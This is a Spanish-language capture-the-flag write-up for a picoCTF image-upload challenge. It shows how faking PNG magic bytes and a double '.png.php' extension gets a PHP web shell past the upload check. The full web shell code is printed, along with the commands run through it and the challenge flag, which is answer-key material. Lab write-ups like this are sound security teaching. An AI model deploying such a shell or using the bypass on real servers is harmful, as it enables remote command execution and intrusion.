## Descripción

I found a web app that can help process images: PNG images only!

Try it (http://atlas.picoctf.net:49348/)

## Solución

1. Accedimos a `robots.txt` y encontramos las rutas `/instructions.txt` y `/uploads/`.

2. Revisamos `instructions.txt` y descubrimos que la página validaba los archivos buscando `.png` en el nombre y los bytes `PNG` al inicio.

3. Creamos un archivo PHP utilizando:
    ```bash
    nano webshell.php
    ```
    Introdujimos el siguiente código:
    ```php
    PNG
    <?php
    echo "<pre>";
    system($_GET['cmd'] ?? 'pwd');
    echo "</pre>";
    ?>
    ```

4. Cambiamos el nombre del archivo para superar la validación:
    ```bash
    mv webshell.php webshell.png.php
    ```

5. Subimos `webshell.png.php` a la página del reto. Después accedimos a:
    ```text
    /uploads/webshell.png.php?cmd=pwd
    ```
    Confirmamos que el archivo ejecutaba comandos PHP en el servidor.

6. Listamos los archivos de la carpeta principal utilizando:
    ```text
    ?cmd=ls%20-la%20/var/www/html
    ```
    Encontramos el archivo `GBRDKM3FGA2TQ.txt`.

7. Leímos su contenido mediante:
    ```text
    ?cmd=cat%20/var/www/html/GBRDKM3FGA2TQ.txt
    ```
    Obtuvimos la bandera:
    ```text
    academy{c3rt!fi3d_Xp3rt_tr1ckst3r_0b53e058}
    ```

## Notas adicionales
La vulnerabilidad consistía en una validación insuficiente de archivos PNG, que permitió subir un archivo PHP y ejecutarlo desde el navegador. Utilizamos los comandos `pwd`, `ls` y `cat` para localizar y leer la bandera.

## Referencias
https://www.youtube.com/watch?v=co8MZmviC1U&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=66